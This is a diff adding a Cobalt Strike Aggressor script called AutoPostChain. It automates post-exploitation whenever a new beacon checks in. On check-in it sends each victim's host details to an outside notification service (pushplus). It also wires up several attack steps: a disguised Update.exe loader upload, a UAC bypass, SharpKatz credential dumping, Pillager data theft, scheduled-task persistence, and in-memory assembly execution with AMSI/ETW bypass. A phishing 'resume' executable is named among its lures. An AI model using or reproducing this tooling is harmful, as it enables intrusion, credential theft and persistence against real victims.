@@ -1,0 +1,556 @@
+##### 参数定义
+$cserverName = "APC";
+$sleepTime = "0";
+$pushplusToken = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+$serverchanKey = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+
+# Loader 路径
+$LoaderName = "Update.exe";
+$LoaderPath = "C:\\Users\\Public\\";
+$LoaderFullPath = $LoaderPath.$LoaderName;
+$b64encodeFullPath = "QzpcVXNlcnNcUHVibGljXFVwZGF0ZS5leGU=";
+
+# 获取需要的 Beacon 信息
+$internalIP = replace(beacon_info($1, "internal"));
+
+##### 用户执行链编排
+sub NormalUser_Chain {
+    # UP_Loader($1);
+    # beacon_inline_execute($1,readbof($1, "whoami"), "go", $null);
+    # beacon_inline_execute($1,readbof($1, "ipconfig"), "go", $null);
+    # beacon_inline_execute($1,readobj($1, "screenshot"), "go", $null);
+    # inlineExecute-Assembly($1,script_resource("/scripts/SharpHostInfo.exe"), "-i $internalIP\/24");
+}
+
+sub BypassUAC {
+    # inlineExecute-Assembly($1,script_resource("/scripts/SharpBypassUAC.exe"), "-b computerdefaults -e $b64encodeFullPath");
+}
+
+sub OnlyAdmin_Chain {
+    # inlineExecute-Assembly($1,script_resource("/scripts/SharpKatz.exe"), "");
+    # Pillager($1);
+    # inlineExecute-Assembly($1, script_resource("/scripts/SharpSchTask.exe"), "$LoaderFullPath 1");
+}
+
+##### ATT&CK 函数模块
+sub UP_Loader {
+    bcd($1, $LoaderPath);
+    blog($1,"\c9开始上传 Loader");
+    bupload($1, script_resource("/scripts/".$LoaderName));
+    # bshell($1, "attrib.exe +h $LoaderName");
+    blog($1, "\c8Loader 文件上传完成");
+    blog($1, "\c8Loader文件位置：$LoaderFullPath");
+}
+
+sub Pillager {
+    $bid = $1;
+	  $barch  = barch($bid);
+
+    $handle1 = openf(script_resource("dist/Pillager/scloader. $+ $barch $+ .o"));
+    $data1   = readb($handle1, -1);
+    closef($handle1);
+
+    $handle2 = openf(script_resource("dist/Pillager/Pillager.bin"));
+    $data2   = readb($handle2, -1);
+    closef($handle2);
+
+    $args   = bof_pack($bid, "b", $data2);
+    beacon_inline_execute($bid, $data1, "go", $args);
+    btask($1, "\c9敏感信息收集完成 文件打包至用户目录：\\AppData\\Local\\Temp\\Pillager.zip");
+}
+
+######  辅助函数定义
+
+sub Note {
+    if ($processName eq "beacon.exe") {
+        bnote($1, "test");
+    }
+    else if ($processName eq "个人简历.exe") {
+        bnote($1, "XX单位社工钓鱼");
+    }
+    else if ($processName eq "javaEE.exe") {
+        bnote($1, "维权上线");
+    } 
+    else if ($processName eq "svchost.exe") {
+        bnote($1, "SchTask维权上线");
+    } 
+    else if ($processName eq "Update.exe") {
+        bnote($1, "BypassUAC上线");
+    } 
+}
+
+##### HTTP GET 模块
+sub http_get {
+    local('$output');
+    $url = [new java.net.URL: $1];
+    $stream = [$url openStream];
+    $handle = [SleepUtils getIOHandle: $stream, $null];
+
+    @content = readAll($handle);
+
+    foreach $line (@content) {
+        $output .= $line . "\r\n";
+    }
+    println($output);
+}
+
+##### BOF 加载
+sub readbof {
+	local('$barch $handle $data $args');
+	$barch  = barch($1);
+
+	# read in the right BOF file
+  println(script_resource("/dist/$2 $+ / $+ $2 $+ . $+ $barch $+ .o"));
+	$handle = openf(script_resource("/dist/$2 $+ / $+ $2 $+ . $+ $barch $+ .o"));
+	$data = readb($handle, -1);
+	closef($handle);
+	if(strlen($data) == 0)
+	{
+		berror($1, "[-] Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script.");
+	}
+
+	# announce what we're doing
+	btask($1, "AutoChain is Running BOF $2");
+	return $data;
+}
+sub readobj {
+	local('$barch $handle $data $args');
+	$barch  = barch($1);
+
+	# read in the right BOF file
+  println(script_resource("/dist/$2 $+ / $+ $2 $+ . $+ $barch $+ .obj"));
+	$handle = openf(script_resource("/dist/$2 $+ / $+ $2 $+ . $+ $barch $+ .obj"));
+	$data = readb($handle, -1);
+	closef($handle);
+	if(strlen($data) == 0)
+	{
+		berror($1, "[-] Error: BOF bin could not be found. Please ensure the compiled BOF (.obj file) exists in the same folder as this aggressor script.");
+	}
+
+	# announce what we're doing
+	btask($1, "AutoChain is Running BOF(.obj) $2");
+	return $data;
+}
+
+##### inlineExecute-Assembly 模块
+
+  global('$etw $amsi $appDomain $version');
+
+    #Global vars don't change
+    $etw = 1;
+    $revertETW = 0;
+    $amsi = 1;
+    $mailSlot = 1;
+    $entryPoint = 1;
+
+    #Default values set here - if you don't want to use flags to change -> change here
+    $appDomain = "DefaultDomain";
+    $pipeName = "DefaultPipe";
+    $mailSlotName = "DefaultMailSlot";
+    #例子：inlineExecute-Assembly($1,script_resource("/scripts/SharpHunter.exe"), "run \"whoami /all\"");
+
+sub inlineExecute-Assembly {
+
+    $data = substr($0, 23);
+    @args = split(' ', $data); 
+    
+    local('$_amsi $_etw $_revertETW $_appDomain $_dotNetAssembly $_version $_assemblyargs $_assemblyWithArgs $_entryPoint $_mailSlot $_mailSlotName $_mailSlotNameArgs $_pipeName $_pipeNameArgs');
+  
+    $_amsi = 1;
+    $_etw = 1;
+    $_revertETW = 0;
+    $_mailSlot = 1;
+    $_mailSlotName = "DefaultMailSlot";
+    $_mailSlotNameArgs = "";
+    $_pipeName = "DefaultPipe";
+    $_pipeNameArgs = "";
+    $_entryPoint = 1;
+    $_appDomain = "DefaultDomain";
+    $_appDomainArgs = "";
+    $_dotNetAssembly = $2;
+    $_dotNetAssemblyArgs = $3;
+    $_assemblyWithArgs = $_dotNetAssemblyArgs;
+
+    @CliOptions = @("--amsi", "--etw", "--revertetw", "--dotnetassembly", "--assemblyargs", "--appdomain", "--pipe", "--mailslot", "--main");
+
+    for ($i = 0; $i < size(@args); $i++){
+
+      if (@args[$i] iswm "--etw"){
+        $_etw = 1;
+      }else if (@args[$i] iswm "--amsi"){
+        $_amsi = 1;
+      }else if (@args[$i] iswm "--revertetw"){
+        $_revertETW = 1;
+      }else if (@args[$i] iswm "--main"){
+        $_entryPoint = int(0);
+      }else if (@args[$i] iswm "--dotnetassembly"){
+        $i = $i + 1;
+        $_dotNetAssembly = @args[$i];
+      }else if (@args[$i] iswm "--assemblyargs"){
+        $i = $i + 1; 
+        $count = 0;  
+        for ($j = $i; $j < size(@args); $j++){
+            if(@args[$j] in @CliOptions){
+                break;
+            }else{
+              @_dotNetAssemblyArgs[$count] = @args[$j];
+              
+              #Taking care of arguments embedded within single/double quotes and consider it as one single argument (disregarding spaces).
+              if(('"' isin @_dotNetAssemblyArgs[$count] || "'" isin @_dotNetAssemblyArgs[$count])){
+
+                $k = 0;
+                $j = $j + 1;
+                
+                for($k = $j; $k < size(@args); $k++){
+                  if(lindexOf(@_dotNetAssemblyArgs[$count], '"') == (strlen(@_dotNetAssemblyArgs[$count]) - 1) || lindexOf(@_dotNetAssemblyArgs[$count], "'") == (strlen(@_dotNetAssemblyArgs[$count]) - 1)){
+                    $k = $k - 1;
+                    break;
+                  }
+                  if('"' isin @args[$k] || "'" isin @args[$k]){
+                    @_dotNetAssemblyArgs[$count] = @_dotNetAssemblyArgs[$count]." ".@args[$k];
+                    break;
+                  }else{
+                    @_dotNetAssemblyArgs[$count] = @_dotNetAssemblyArgs[$count]." ".@args[$k];
+                  }
+                }
+                $j = $k;
+                $i = $k;
+              }
+              $count = $count + 1;                     
+            }
+        }
+      }else if (@args[$i] iswm "--appdomain"){
+        $i = $i + 1; 
+        $count = 0;  
+        for ($j = $i; $j < size(@args); $j++){
+            if(@args[$j] in @CliOptions){
+                break;
+            }else{
+              @_appDomain[$count] = @args[$j];
+              
+              #Taking care of arguments embedded within single/double quotes and consider it as one single argument (disregarding spaces).
+              if(('"' isin @_appDomain[$count] || "'" isin @_appDomain[$count])){
+
+                $k = 0;
+                $j = $j + 1;
+                
+                for($k = $j; $k < size(@args); $k++){
+                  if(lindexOf(@_appDomain[$count], '"') == (strlen(@_appDomain[$count]) - 1) || lindexOf(@_appDomain[$count], "'") == (strlen(@_appDomain[$count]) - 1)){
+                    $k = $k - 1;
+                    break;
+                  }
+                  if('"' isin @args[$k] || "'" isin @args[$k]){
+                    @_appDomain[$count] = @_appDomain[$count]." ".@args[$k];
+                    break;
+                  }else{
+                    @_appDomain[$count] = @_appDomain[$count]." ".@args[$k];
+                  }
+                }
+
+                $j = $k;
+                $i = $k;
+              }
+              $count = $count + 1;                     
+            }
+          }
+        }else if (@args[$i] iswm "--mailslot"){
+        $_mailSlot = 1;
+        $i = $i + 1; 
+        $count = 0;  
+        for ($j = $i; $j < size(@args); $j++){
+            if(@args[$j] in @CliOptions){
+                break;
+            }else{
+              @_mailSlotName[$count] = @args[$j];
+              
+              #Taking care of arguments embedded within single/double quotes and consider it as one single argument (disregarding spaces).
+              if(('"' isin @_mailSlotName[$count] || "'" isin @_mailSlotName[$count])){
+
+                $k = 0;
+                $j = $j + 1;
+                
+                for($k = $j; $k < size(@args); $k++){
+                  if(lindexOf(@_mailSlotName[$count], '"') == (strlen(@_mailSlotName[$count]) - 1) || lindexOf(@_mailSlotName[$count], "'") == (strlen(@_mailSlotName[$count]) - 1)){
+                    $k = $k - 1;
+                    break;
+                  }
+                  if('"' isin @args[$k] || "'" isin @args[$k]){
+                    @_mailSlotName[$count] = @_mailSlotName[$count]." ".@args[$k];
+                    break;
+                  }else{
+                    @_mailSlotName[$count] = @_mailSlotName[$count]." ".@args[$k];
+                  }
+                }
+                $j = $k;
+                $i = $k;
+              }
+              $count = $count + 1;                    
+            }
+        }
+        }else if (@args[$i] iswm "--pipe"){
+        $i = $i + 1; 
+        $count = 0;  
+        for ($j = $i; $j < size(@args); $j++){
+            if(@args[$j] in @CliOptions){
+                break;
+            }else{
+              @_pipeName[$count] = @args[$j];
+              
+              #Taking care of arguments embedded within single/double quotes and consider it as one single argument (disregarding spaces).
+              if(('"' isin @_pipeName[$count] || "'" isin @_pipeName[$count])){
+
+                $k = 0;
+                $j = $j + 1;
+                
+                for($k = $j; $k < size(@args); $k++){
+                  if(lindexOf(@_pipeName[$count], '"') == (strlen(@_pipeName[$count]) - 1) || lindexOf(@_pipeName[$count], "'") == (strlen(@_pipeName[$count]) - 1)){
+                    $k = $k - 1;
+                    break;
+                  }
+                  if('"' isin @args[$k] || "'" isin @args[$k]){
+                    @_pipeName[$count] = @_pipeName[$count]." ".@args[$k];
+                    break;
+                  }else{
+                    @_pipeName[$count] = @_pipeName[$count]." ".@args[$k];
+                  }
+                }
+
+                $j = $k;
+                $i = $k;
+              }
+
+              $count = $count + 1;
+                      
+            }
+        }
+      }
+    }
+
+    # Appending .NET assembly arguments to $_assemblyWithArgs var (separated by " ")
+
+    for ($i = 0; $i < size(@_dotNetAssemblyArgs); $i++){
+      if (@_dotNetAssemblyArgs[$i] ne "") {
+        if ($_assemblyWithArgs ne "")
+        {
+          $_assemblyWithArgs = $_assemblyWithArgs." ".@_dotNetAssemblyArgs[$i];
+        }
+        else
+        {
+          $_assemblyWithArgs = @_dotNetAssemblyArgs[$i];
+        }      
+      }
+    }
+
+    # Appending appDomain arguments to $_appDomainArgs var (separated by " ")
+
+    for ($i = 0; $i < size(@_appDomain); $i++){
+      if (@_appDomain[$i] ne "") {
+        if ($_appDomainArgs ne "")
+        {
+          $_appDomainArgs = $_appDomainArgs." ".@_appDomain[$i];
+        }
+        else
+        {
+          $_appDomainArgs = @_appDomain[$i];
+        }     
+      }
+    }
+
+    #  Appending mailSlot arguments to $_mailSlotNameArgs var (separated by " ")
+
+    for ($i = 0; $i < size(@_mailSlotName); $i++){
+      if (@_mailSlotName[$i] ne "") {
+        if ($_mailSlotNameArgs ne "")
+        {
+          $_mailSlotNameArgs = $_mailSlotNameArgs." ".@_mailSlotName[$i];
+        }
+        else
+        {
+          $_mailSlotNameArgs = @_mailSlotName[$i];
+        }  
+      }
+    }
+
+    # Appending pipeName arguments to $_pipeNameArgs var (separated by " ")
+
+    for ($i = 0; $i < size(@_pipeName); $i++){
+      if (@_pipeName[$i] ne "") {
+        if ($_pipeNameArgs ne "")
+        {
+          $_pipeNameArgs = $_pipeNameArgs." ".@_pipeName[$i];
+        }
+        else
+        {
+          $_pipeNameArgs = @_pipeName[$i];
+        }       
+      }
+    }
+    
+    if ($_appDomainArgs eq "") {
+      $_appDomainArgs = $appDomain;
+      }
+    if ($_mailSlotNameArgs eq "") {
+      $_mailSlotNameArgs = $mailSlotName;
+      }
+    if ($_pipeNameArgs eq "") {
+      $_pipeNameArgs = $pipeName;
+      }
+    if ($_amsi == "") {
+      $_amsi = $amsi;
+      }
+    if ($_etw == "") {
+      $_etw = $etw;
+      }
+    if ($_revertETW == "") {
+      $_revertETW = $revertETW;
+      }
+    if ($_entryPoint ne int(0)) {
+      $_entryPoint = $entryPoint;
+      }
+    if ($_mailSlot == "") {
+      $_mailSlot = $mailSlot;
+    }
+
+  # Error Handling
+
+    $assemblyPath = $_dotNetAssembly;
+    $bid = $1;
+    if ($assemblyPath eq "") {
+      berror($bid, "Run 'help inlineExecute-Assembly'\n");
+      return;
+    }
+
+    if (!-exists $assemblyPath || !-isFile $assemblyPath){
+      berror($bid, "File ".$assemblyPath." doesn't exist\n");
+      return;
+    }
+  
+    # Reading assembly bytes and get the size in bytes
+    $fileHandle = openf($_dotNetAssembly);
+    $assemblyLength = lof($_dotNetAssembly);
+    $assemblyBytes = readb($fileHandle, -1);
+    closef($fileHandle);
+
+    # pack our arguments
+    $bofArgs = bof_pack($1, "ziiiiizzzib", $_appDomainArgs, $_amsi, $_etw, $_revertETW, $_mailSlot, $_entryPoint, $_mailSlotNameArgs, $_pipeNameArgs, $_assemblyWithArgs, $assemblyLength, $assemblyBytes);
+    # execute it.
+    beacon_inline_execute($1, readbof($1, "inlineExecute-Assembly"), "go", $bofArgs);
+    btask($1, "\c9InlineExecute-Assembly $2 $3"); 
+  
+    clear(@_assemblyWithArgs);
+    clear(@_dotNetAssemblyArgs);
+    clear(@_appDomainArgs);
+    clear(@_appDomain);
+    clear(@_mailSlotNameArgs);
+    clear(@_mailSlotName);
+    clear(@_pipeNameArgs);
+    clear(@_pipeName);
+}
+
+action("\c8* AutoPostChain - Aggressor Load Success!");
+
+##### 自动化链编排
+on beacon_initial {
+
+    blog($1,"\c9Automated Post Exploitation Chain (@lintstar)"); 
+
+    # 获取主机信息
+    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
+    $externalIP = replace(beacon_info($1, "external"), " ", "_");
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");
+    $userName = replace(beacon_info($1, "user"), " ", "_");
+    $listennerName = replace(beacon_info($1, "listener"), " ", "_");
+    $processName = replace(beacon_info($1, "process"), " ", "_");
+    $pidName = replace(beacon_info($1, "pid"), " ", "_");
+    $archName = replace(beacon_info($1, "arch"), " ", "_");
+    $onlineUrl = 'https://www.pushplus.plus/send?token='.$pushplusToken.'&title=%5B'.$cserverName.'%5D%20%E5%92%AC%E9%92%A9%20%F0%9F%8E%AE%20'.$processName.'&template=markdown&content=HostName%3A%20'.$computerName.'%0A%0AExternal%3A%20'.$externalIP.'%0A%0AInternal%3A%20'.$internalIP.'%0A%0AUserName%3A%20'.$userName.'%0A%0AProcess%3A%20'.$processName.'%0A%0APid%3A%20'.$pidName;
+    # $onlineUrl = 'https://sctapi.ftqq.com/'.$serverchanKey.'.send?text=CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&desp=%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0Aip:'.$internalIP.'%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:'.$userName.'%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:'.$computerName;
+
+
+    println('=================================================================================================================');
+    println('[+] '.formatDate('MM/dd/yyyy HH:mm:ss (z)').'  IP:'.$internalIP.'  UserName:'.$userName.'  ComputerName:'.$computerName);
+
+###### 存活逻辑判断
+
+    $x = 0;
+    $y = 0;
+    $z = 0;
+
+    foreach $bid (beacon_ids()) {
+
+        # bid 遍历主机信息信息
+        $inIP = replace(beacon_info($bid, "internal"), " ", "_");
+        $uName = replace(beacon_info($bid, "user"), " ", "_");
+        $prName = replace(beacon_info($bid, "process"), " ", "_");
+        $piName = replace(beacon_info($bid, "pid"), " ", "_");
+        $hName = replace(beacon_info($bid, "computer"), " ", "_");
+        $lastTime = replace(beacon_info($bid, "last"), " ", "_");
+
+        if (-isactive $bid && $lastTime <= 60000) {
+
+            @ip[$x] = $inIP;
+            @pid[$x] = $piName;
+            @pro[$x] = $prName;
+            @last[$x] = $lastTime;
+            @un[$x] = $uName;
+
+            # 如果遍历的 hName 与当前会话的 computerName 相同，则 x+1
+            if ($hName eq $computerName && $inIP eq $internalIP) {
+
+                $x = $x + 1;
+
+                # 如果为管理员权限，则 y+1
+                if (-isadmin $bid) {
+                    $y = $y + 1;
+                }
+                $z = $x - $y                              
+            }
+        }
+    }
+
+    blog($1, "\c8=====================");
+    blog($1, "\c8当前主机总存活数： $+ $x");
+    blog($1, "\c8管理员权限会话存活数： $+ $y");
+    blog($1, "\c8用户权限会话存活数： $+ $z");    
+    blog($1, "\c8=====================");
+
+###### 场景流程编排
+
+    Note($1);
+    # bsleep($1, $sleepTime);
+    if (!-isadmin $1) {
+        http_get($onlineUrl);
+        blog($1, "\c9普通用户权限");
+
+        # 直接上线普通用户权限
+        if ($x < 2) {
+            NormalUser_Chain($1);
+            BypassUAC($1);
+       
+        # 重复上线普通用户权限  
+        }else{
+            blog($1, "\cB当前主机存活数大于等于2 请检查是否已提升至管理员权限 [ AutoPostChain End ]");
+            blog($1, "\c9存活列表：\nIP: ".replace(@ip, "@", "")."\n进程名: ".replace(@pro, "@", "")."\n进程号: ".replace(@pid, "@", "")."\n心跳: ".replace(@last, "@", "")."\n用户名: ".replace(@un, "@", ""));
+        }
+
+    } else {
+        http_get($onlineUrl);
+        blog($1, "\c9管理员权限");
+
+        # 普通用户绕 UAC 上线管理员权限
+        if ($y < 2 && $z > 0) {
+            blog($1, "\c8该管理员会话为普通用户通过绕 UAC 上线 不再进行 UAC Bypass");
+            OnlyAdmin_Chain($1);
+
+        # 直接上线管理员权限    
+        } else if ($y < 2 && $z < 1) {
+            NormalUser_Chain($1);
+            OnlyAdmin_Chain($1);
+   
+        # 重复上线管理员权限
+        }else {
+            blog($1, "\cB该IP存活数量大于2 且已经存在管理员权限会话 [ AutoPostChain End ]");
+            blog($1, "\c9存活列表：\nIP: ".replace(@ip, "@", "")."\n进程名: ".replace(@pro, "@", "")."\n进程号: ".replace(@prName, "@", "")."\n心跳: ".replace(@lastTime, "@", "")."\n用户名: ".replace(@un, "@", ""));
+        }
+    }     
+}
